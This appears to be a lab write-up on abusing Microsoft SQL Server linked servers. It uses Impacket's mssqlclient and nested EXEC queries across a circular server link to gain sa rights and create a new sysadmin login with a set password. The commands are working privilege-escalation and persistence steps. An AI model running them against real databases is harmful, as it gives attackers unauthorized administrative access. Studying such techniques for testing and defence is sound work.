---
title: Abusing MSSQL Linked Servers [Adding sa user & File Read]
author: r0b0tG4nG
date: 2021-12-16 10:18:00 +0000
categories: [Blogging, Exploiting]
tags: [writeups, mssql, impacket-mssqlclient, python , xp_cmdshell, sp_execute_external_script]
math: true
mermaid: true
---

![image](https://user-images.githubusercontent.com/67085453/146367126-2c4334c7-4664-4581-9ab7-bcc2b0d9da0b.png)<br><br>


**> Information Gathering**<br>

Microsoft SQL Server is a <a href="https://en.wikipedia.org/wiki/Relational_database_management_system">relational database management system</a> developed by <a href="https://en.wikipedia.org/wiki/Microsoft">Microsoft</a>. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet).<br>

Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library. More Information can be found at <a href="https://github.com/SecureAuthCorp/impacket">
SecureAuth Corporation</a><br>

In this engagement, we will use <a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_24/examples/mssqlclient.py">Impacket-mssqlclient.py</a> script. First we will login to the mssql service using the `mssql-client.py`, to do this we will parse the database credentials and ip as agruments to the `mssql-client.py` script. `impacket-mssqlclient external_user:"#p00Public3xt3rnalUs3r#"@10.13.38.11`.<br>
![image](https://user-images.githubusercontent.com/67085453/146365268-90142593-59e6-4a33-8d10-1f6d3286ea9b.png)<br>

After logging in to the mssql database, we will haev to check if the user has sysadmin privileges on the databases. This can be done by querying the <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-syslogins-transact-sql?view=sql-server-ver15">syslogins table</a> using the command `SELECT name,sysadmin from syslogins;`.<br>
![image](https://user-images.githubusercontent.com/67085453/146365388-6c93e881-bde7-493d-842c-d4423239c15d.png)<br>

The database has two users `sa` & `external_user`. From the output, we can see the current user doesn't have `sysadmin privileges`, which means we can't use <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15">xp_cmdshell</a> to execute OS commands. We can check this by trying to enable `xp_cmdshell`<br>
![image](https://user-images.githubusercontent.com/67085453/146365484-c895eebc-9914-4b07-8b40-5c2e1cd12635.png)<br>

Microsoft SQL servers provides the ability to link external resources such as Oracle databases and other SQL servers. This is common to find in domain environments and can be exploited in case of misconfigurations. To verify if there are any linked servers on the current database, we will have to query the <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql?view=sql-server-ver15">sysservers table</a> by executing the command `select srvname,isremote from sysservers;`.<br>
![image](https://user-images.githubusercontent.com/67085453/146365758-f02ba0e1-f680-487e-8edd-3302e1026288.png)<br>

Quering the table displayed two entries: `POO_PUBLIC (current server)` and `POO_CONFIG`. According to the documentation, `isremote column` determines if a server is linked or not. The `value 1` stands for `remote server`, while the value `0 stands for a linked server`. From this, we can conclude that `POO_CONFIG` is a linked server.<br>

From the docs, `EXEC` statement can be used to execute queries on linked servers. The next step is to find out the user in whose context we will be able to query the linked server. To do this, we will type `EXECUTE ('select suser_name();') at [COMPATIBILITY\POO_CONFIG];`<br>
![image](https://user-images.githubusercontent.com/67085453/146365942-3a17d65c-fa93-457b-b35e-8c9486a698e5.png)<br>

The queries on the linked server `POO_CONFIG` are running as `internal_user`. To do greater damage, in this scenario, we will need the permissions of the `sa` user, so its best to check is the `internal_user` is `sa` on the targett or has `sa` privileges assigned to this user. To do this, we will execute the commmand `EXECUTE ('SELECT name,sysadmin from syslogins;') at [COMPATIBILITY\POO_CONFIG];`.<br>
![image](https://user-images.githubusercontent.com/67085453/146366041-0c7e6ba7-4f7f-4d23-9751-e64b5f691fcc.png)<br>

Bad luck on our side, the user `internal_user` is also not a `sysadmin` on the target. That is not the end remember this target has linked databases so we can try to enumerate the `POO_CONFIG` server to see if it has more links. We can recon on more links using `EXECUTE ('select srvname,isremote from sysservers;') at [COMPATIBILITY\POO_CONFIG];`.<br>
![image](https://user-images.githubusercontent.com/67085453/146366129-93d9a1e9-7d5a-4ad1-bdc9-c266f4e62d5e.png)<br>

From the image above, we can see that `POO_CONFIG` is in turn linked to `POO_PUBLIC`, making it a circular link. This is good news to the eyes since we can use nested queries to find out what user we're running as. Let's execute this command `EXEC ('EXEC (''select suser_name();'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];`.<br>
![image](https://user-images.githubusercontent.com/67085453/146366345-e90d8172-c3a7-4b0c-850f-1a1553ccae17.png)<br>

A nested `EXEC statement` is used to find the username after crawling back from the `POO_CONFIG link`. The query returned `sa`, which means that the link allows us to execute queries as the `sysadmin user` on our current database `POO_PUBLIC`. The diagram below shows how the links are crawled in order to attain `sa privileges`. We can use these privileges to change the `sa password` on `POO_PUBLIC`.<br>
![image](https://user-images.githubusercontent.com/67085453/146366439-f55a6706-98fe-4852-89c1-ce94c45b4d8e.png)<br>

With this information, we can add a new `sa user` to the `POO_PUBLIC` database using a nested query. We will add a new SQL user named `r0b0t` with the password `P@ssword123` . The `r0b0t` user will be granted `sysadmin level privileges`. To avoid errors, we all single quotes should be escaped with another quote.<br>

We now add the `r0b0t` user and also grant him the `sysadmin privileges`. To achieve this, we will use the following commands. <br> 
`EXECUTE('EXECUTE(''CREATE LOGIN r0b0t WITH PASSWORD = ''''P@ssword123'''' '') AT "COMPATIBILITY\POO_PUBLIC"') AT "COMPATIBILITY\POO_CONFIG" `<br>
`EXECUTE('EXECUTE(''sp_addsrvrolemember ''''r0b0t'''' , ''''sysadmin'''' '') AT "COMPATIBILITY\POO_PUBLIC"') AT "COMPATIBILITY\POO_CONFIG"`<br>
![image](https://user-images.githubusercontent.com/67085453/146366521-20ad5699-cced-436f-a8ba-643acd48d2b9.png)<br>

The command was executed successfully without any errors. We can login to the `mssql` database using the username `r0b0t` & password `P@ssword123`. To achieve this, we will need `impacket-mssqlclient` script with the argument `impacket-mssqlclient r0b0t:'P@ssword123'@10.13.38.11`.<br>
![image](https://user-images.githubusercontent.com/67085453/146366926-91d93953-d63f-431f-acb4-305e1f275077.png)<br>


